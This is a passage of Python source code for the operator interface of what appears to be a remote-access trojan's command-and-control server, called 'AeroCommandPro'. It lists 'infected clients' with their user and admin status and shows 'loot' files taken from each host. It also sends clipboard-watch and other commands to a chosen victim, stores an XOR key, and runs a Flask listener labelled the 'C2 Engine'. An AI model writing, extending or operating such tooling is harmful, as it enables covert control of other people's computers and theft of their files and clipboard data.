        if os.path.exists(LOOT_DIR):
            for host in os.listdir(LOOT_DIR):
                path = os.path.join(LOOT_DIR, host)
                if not os.path.isdir(path): continue
                
                host_files = [f for f in os.listdir(path) if os.path.isfile(os.path.join(path, f))]
                if not host_files: continue
                
                has_files = True
                group = ctk.CTkFrame(self.file_scroll, fg_color=COLOR_CARD, corner_radius=4, border_width=1, border_color=COLOR_BORDER)
                group.pack(fill="x", padx=10, pady=8)
                
                ctk.CTkLabel(group, text=f"💻 {host}", font=ctk.CTkFont(weight="bold"), text_color=COLOR_ACCENT).pack(anchor="w", padx=15, pady=10)
                
                for f in host_files:
                    f_path = os.path.join(path, f)
                    f_row = ctk.CTkFrame(group, fg_color="transparent")
                    f_row.pack(fill="x", padx=15, pady=2)
                    
                    ctk.CTkLabel(f_row, text=f"📄 {f}", font=ctk.CTkFont(size=12), text_color=COLOR_TEXT_MAIN).pack(side="left")
                    ctk.CTkButton(f_row, text="Open", width=60, height=26, fg_color=COLOR_BORDER, hover_color=COLOR_ACCENT, command=lambda p=f_path: os.startfile(p) if hasattr(os, 'startfile') else os.system(f"xdg-open {p}")).pack(side="right")

        if not has_files:
            empty_frame = ctk.CTkFrame(self.file_scroll, fg_color="transparent")
            empty_frame.pack(expand=True, pady=60)
            ctk.CTkLabel(empty_frame, text="📂", font=ctk.CTkFont(size=40)).pack(pady=(0, 10))
            ctk.CTkLabel(empty_frame, text="No files or loot collected yet", font=ctk.CTkFont(size=16, weight="bold"), text_color=COLOR_TEXT_MAIN).pack(pady=(0, 5))
            ctk.CTkLabel(empty_frame, text="Files uploaded or downloaded from endpoints will appear here.", font=ctk.CTkFont(size=13), text_color=COLOR_TEXT_MUTED).pack()

    # --- Clipboard Panel ---
    def _create_clipboard(self):
        panel = ctk.CTkFrame(self.main_container, fg_color="transparent")
        panel.grid_rowconfigure(1, weight=1)
        panel.grid_columnconfigure(0, weight=1)

        ctrls = ctk.CTkFrame(panel, fg_color="transparent")
        ctrls.grid(row=0, column=0, sticky="ew", pady=(0, 15))
        
        ctk.CTkButton(ctrls, text="▶️ Start Watch", fg_color=COLOR_SUCCESS, text_color=COLOR_BG, command=lambda: self.send_cmd("clipwatch")).pack(side="left", padx=5)
        ctk.CTkButton(ctrls, text="⏹️ Stop Watch", fg_color=COLOR_DANGER, command=lambda: self.send_cmd("clipstop")).pack(side="left", padx=5)
        ctk.CTkButton(ctrls, text="Clear", fg_color=COLOR_SIDEBAR, border_width=1, border_color=COLOR_BORDER, command=lambda: self.clip_box.delete("1.0", "end")).pack(side="right")

        self.clip_box = ctk.CTkTextbox(panel, fg_color=COLOR_CARD, text_color=COLOR_TEXT_MAIN, font=ctk.CTkFont(family="Consolas"), border_width=1, border_color=COLOR_BORDER)
        self.clip_box.grid(row=1, column=0, sticky="nsew")

        return panel

    # --- Database Panel ---
    def _create_database(self):
        panel = ctk.CTkFrame(self.main_container, fg_color="transparent")
        panel.grid_rowconfigure(1, weight=1)
        panel.grid_columnconfigure(0, weight=1)

        self.db_tabs = ctk.CTkTabview(panel, fg_color=COLOR_CARD, segmented_button_selected_color=COLOR_ACCENT, segmented_button_selected_hover_color=COLOR_ACCENT)
        self.db_tabs.grid(row=1, column=0, sticky="nsew")
        
        self.tab_clients = self.db_tabs.add("Clients")
        self.tab_logs = self.db_tabs.add("Command Logs")

        # Configure ttk style for tables
        style = ttk.Style()
        try:
            style.theme_use("clam")
        except:
            pass
        style.configure("Treeview",
            background=COLOR_BG,
            foreground=COLOR_TEXT_MAIN,
            fieldbackground=COLOR_BG,
            borderwidth=0,
            rowheight=30
        )
        style.configure("Treeview.Heading",
            background=COLOR_SIDEBAR,
            foreground=COLOR_TEXT_MAIN,
            font=('Segoe UI', 11, 'bold')
        )
        style.map("Treeview", background=[('selected', COLOR_ACCENT)], foreground=[('selected', COLOR_BG)])

        # Clients Table
        clients_frame = ctk.CTkFrame(self.tab_clients, fg_color="transparent")
        clients_frame.pack(fill="both", expand=True, padx=10, pady=10)
        clients_frame.grid_rowconfigure(0, weight=1)
        clients_frame.grid_columnconfigure(0, weight=1)

        client_columns = ("client_id", "host", "ip", "pid", "os", "user", "admin", "first_seen", "last_seen", "status")
        self.client_tree = ttk.Treeview(clients_frame, columns=client_columns, show="headings", selectmode="browse")
        
        client_headings = {
            "client_id": "Client ID",
            "host": "Host",
            "ip": "IP Address",
            "pid": "PID",
            "os": "Operating System",
            "user": "User",
            "admin": "Admin",
            "first_seen": "First Seen",
            "last_seen": "Last Seen",
            "status": "Status"
        }
        for col, text in client_headings.items():
            self.client_tree.heading(col, text=text)
            self.client_tree.column(col, width=130, anchor="w")

        client_scroll = ttk.Scrollbar(clients_frame, orient="vertical", command=self.client_tree.yview)
        self.client_tree.configure(yscrollcommand=client_scroll.set)
        
        self.client_tree.grid(row=0, column=0, sticky="nsew")
        client_scroll.grid(row=0, column=1, sticky="ns")

        # Command Logs Table
        logs_frame = ctk.CTkFrame(self.tab_logs, fg_color="transparent")
        logs_frame.pack(fill="both", expand=True, padx=10, pady=10)
        logs_frame.grid_rowconfigure(0, weight=1)
        logs_frame.grid_columnconfigure(0, weight=1)

        log_columns = ("id", "client_id", "command", "output", "timestamp")
        self.log_tree = ttk.Treeview(logs_frame, columns=log_columns, show="headings", selectmode="browse")
        
        log_headings = {
            "id": "ID",
            "client_id": "Client ID",
            "command": "Command",
            "output": "Output",
            "timestamp": "Timestamp"
        }
        for col, text in log_headings.items():
            self.log_tree.heading(col, text=text)
            self.log_tree.column(col, width=160, anchor="w")
        self.log_tree.column("output", width=300)

        log_scroll = ttk.Scrollbar(logs_frame, orient="vertical", command=self.log_tree.yview)
        self.log_tree.configure(yscrollcommand=log_scroll.set)
        
        self.log_tree.grid(row=0, column=0, sticky="nsew")
        log_scroll.grid(row=0, column=1, sticky="ns")

        return panel

    def _load_db(self):
        for item in self.client_tree.get_children():
            self.client_tree.delete(item)
        for item in self.log_tree.get_children():
            self.log_tree.delete(item)
        
        with sqlite3.connect(DB_FILE) as conn:
            cur = conn.cursor()
            cur.execute("SELECT * FROM clients ORDER BY last_seen DESC")
            for r in cur.fetchall():
                # Format admin as Yes/No
                r_list = list(r)
                r_list[6] = "Yes" if r_list[6] else "No"
                self.client_tree.insert("", "end", values=r_list)
            
            cur.execute("SELECT * FROM command_logs ORDER BY timestamp DESC LIMIT 100")
            for r in cur.fetchall():
                self.log_tree.insert("", "end", values=r)

    # --- Settings Panel ---
    def _create_settings(self):
        panel = ctk.CTkFrame(self.main_container, fg_color=COLOR_CARD, corner_radius=15, border_width=1, border_color=COLOR_BORDER)
        panel.grid_columnconfigure(0, weight=1)
        
        ctk.CTkLabel(panel, text="Server Configuration", font=ctk.CTkFont(size=18, weight="bold")).pack(anchor="w", padx=30, pady=(30, 20))
        
        info = [
            (f"Listening Port: {DEFAULT_PORT}"),
            (f"XOR Key: 0x{XOR_KEY:02X}"),
            (f"Heartbeat: {HEARTBEAT_TIMEOUT}s"),
            (f"DB Path: {os.path.abspath(DB_FILE)}"),
            (f"Loot Path: {os.path.abspath(LOOT_DIR)}")
        ]
        
        for text in info:
            ctk.CTkLabel(panel, text=f"• {text}", font=ctk.CTkFont(size=14), text_color=COLOR_TEXT_MAIN).pack(anchor="w", padx=40, pady=5)
            
        return panel

    # --- Core Logic ---
    def start_server_thread(self):
        def run():
            try:
                state.is_running = True
                state.add_log(f"C2 Engine initialized on port {DEFAULT_PORT}", "success")
                server_app.run(host="0.0.0.0", port=DEFAULT_PORT, debug=False, use_reloader=False)
            except Exception as e:
                state.add_log(f"Critical Server Error: {e}", "warning")
                self.status_dot.configure(text_color=COLOR_DANGER)
                self.status_text.configure(text="Port Error")

        threading.Thread(target=run, daemon=True).start()

    def send_cmd(self, cmd):
        with state.lock:
            target = state.target_client
            if not target:
                messagebox.showwarning("Warning", "No active target selected.")
                return
            if target not in state.pending_commands: state.pending_commands[target] = []
            state.pending_commands[target].append(cmd)
            host = state.infected_clients.get(target, {}).get('host', target)
        
        state.add_log(f"Command queued for {host}: {cmd}")
        self.show_toast("Command Dispatched")

    def send_cmd_to(self, cmd, cid):
        with state.lock:
            if cid not in state.pending_commands: state.pending_commands[cid] = []
            state.pending_commands[cid].append(cmd)
        state.add_log(f"Command sent to {cid[:8]}")

    def _setup_state_bindings(self):
        state.log_callbacks.append(lambda m, t: self.after(0, lambda: self._add_log_gui(m, t)))
        state.client_update_callbacks.append(lambda: self.after(0, self._refresh_clients))
        state.result_callbacks.append(lambda c, o: self.after(0, lambda: self.terminal.insert("end", f"{o}\n")))
        state.clipboard_callbacks.append(lambda c, t: self.after(0, lambda: self.clip_box.insert("end", f"[{c[:8]}] {t}\n")))
        state.file_callbacks.append(lambda c, n, p, s: self.after(0, self._refresh_files))

    def _add_log_gui(self, msg, tag):
        self.log_text.insert("end", msg + "\n")
        self.log_text.see("end")

    def _update_uptime(self):
        uptime = str(datetime.now() - state.start_time).split('.')[0]
        if "uptime" in self.metrics:
            self.metrics["uptime"].configure(text=uptime)
        self.after(1000, self._update_uptime)

    def _update_resource_graphs(self):
        try:
            cpu = psutil.cpu_percent(interval=None)
            ram = psutil.virtual_memory().percent
            
            self.cpu_history.pop(0)
            self.cpu_history.append(cpu)
            
            self.ram_history.pop(0)
            self.ram_history.append(ram)
            
            self.cpu_val_lbl.configure(text=f"{cpu:.1f}%")
            self.ram_val_lbl.configure(text=f"{ram:.1f}%")
            
            self._draw_graph(self.cpu_canvas, self.cpu_history, COLOR_ACCENT)
            self._draw_graph(self.ram_canvas, self.ram_history, COLOR_ACCENT_ALT)
        except Exception:
            pass
        self.after(1000, self._update_resource_graphs)

    def _draw_graph(self, canvas, data, color):
        canvas.delete("all")
        w = canvas.winfo_width()
        h = canvas.winfo_height()
        if w < 10 or h < 10:
            return
        
        n = len(data)
        dx = w / (n - 1) if n > 1 else w
        points = []
        for i, val in enumerate(data):
            x = i * dx
            y = h - (val / 100.0) * (h - 10) - 5
            points.append((x, y))
        
        poly_points = [(0, h)] + points + [(w, h)]
        canvas.create_polygon(poly_points, fill=color, stipple="gray25", outline="")
        
        for i in range(len(points) - 1):
            canvas.create_line(points[i][0], points[i][1], points[i+1][0], points[i+1][1], fill=color, width=2, smooth=True)

    def _update_metrics(self):
        with state.lock:
            online = len(state.infected_clients)
            target = state.target_client
            target_name = state.infected_clients[target].get('host', "None") if target and target in state.infected_clients else "None"
        
        try:
            with sqlite3.connect(DB_FILE) as conn:
                total = conn.execute("SELECT COUNT(*) FROM clients").fetchone()[0]
        except: total = 0
        
        self.metrics["online"].configure(text=str(online))
        self.metrics["total"].configure(text=str(total))
        self.metrics["target"].configure(text=target_name)
        self.term_target.configure(text=f"Target: {target_name}")

    def _periodic_ui_refresh(self):
        self._update_metrics()
        self.after(5000, self._periodic_ui_refresh)

if __name__ == "__main__":
    app = AeroCommandPro()
    app.mainloop()
